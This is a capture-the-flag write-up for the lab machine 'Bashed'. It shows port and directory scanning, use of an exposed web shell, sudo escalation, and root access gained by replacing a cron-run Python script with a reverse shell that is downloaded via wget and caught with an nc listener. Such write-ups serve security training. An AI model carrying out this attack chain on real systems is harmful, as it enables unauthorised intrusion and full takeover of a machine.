# Bashed

This is the write-up for the machine Bashed.

## Scanning & Enumeration

Let's start with an nmap scan:

```markdown
nmap -T4 -A -p- 10.10.10.68
```

Relevant results of the scan:

```markdown
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site
```

## HTTP

The HTTP port is open and a web page contains information about a tool called **phpbash**.
We can do directory busting to find the subdirectories of the web blog using **Gobuster**:

```markdown
gobuster -u http://10.10.10.68 dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Gobuster** finds an _/uploads_, _/php_, and _/dev_ subdirectories that are relevant to us.
The _/dev_ directory is the tool **phpbash.php** it starts a web shell in the browser.
We can use this to create a reverse shell on our machine. 

## Privilege Escalation from web shell to scriptmanager

Switch to user **www-data** and run the following command:

```markdown
sudo -l
```

Results of **sudo -l**:

```markdown
Matching Defaults entries for www-data on bashed:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
(scriptmanager : scriptmanager) NOPASSWD: ALL
```

We see that we can run commands as user **scriptmanager** without a password.

We can start a bash shell as the user **scriptmanager**:

```markdown
sudo -u scriptmanager bash
```

We are now **scriptmanager** on the machine.

## Privilege Escalation to root

We can look at the directories owned by the user **scriptmanager**, there is a directory _/scripts_ at the root path, which is unusual for a linux machine:

```markdown
find / -type d -group scriptmanager -user scriptmanager 2>/dev/null
```

In the _/scripts_ there are two files with the following permissions and content:

```markdown
-rw-r--r-- 1 scriptmanager scriptmanager 58 Dec  4  2017 test.py
-rw-r--r-- 1 root          root          12 Feb  5 11:23 test.txt
```

Contents of the file after running cat:

```markdown
cat test.txt

#Output
testing 123!
```

```markdown
cat test.py

#Output:
f = open("test.txt", "w")
f.write("testing 123!")
f.close
```

We can see that the Python script _test.py_ writes a string "testing123!" into the text file _test.txt_ which refreshes its date every minute.
It is most likely a scheduled task/cron job.

The Python script file belongs to **scriptmanager** and we can write to it and the text file is owned by root. Therefore we can exploit this by modifying the script to execute a reverse shell.
[pentestmonkey](http://www.pentestmonkey.net) has a python reverse shell script snippet that can be found [here](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).

Change the IP and port number to your machine's IP and desired port number (2345 in my case) in the script. You can also change the _p=subprocess.call(["/bin/sh","-i"])_ to use an interactive bash shell 
instead like _p=subprocess.call(["/bin/bash","-i"])_.
Save the script on your machine to a directory of your choice and execute the following command to start an HTTP server on your machine:

```markdown
python -m SimpleHTTPServer 9001 //Or any port that is open on your machine
```
Start another tab on the terminal on your machine and type the following command to set up a listener:

```markdown
nc -nvlp 2345 //Or any port that is open on your machine
```

Type the following commands on Bashed as **scriptmanager**:

```markdown
rm test.py
wget http://<your_ip>/<directory_to_test.py_on_your_machine>/test.py
```
We can wait for one minute and we will see that the script gets executed and the listener on our IP and our desired port (2345 in my case) starts a session as root.
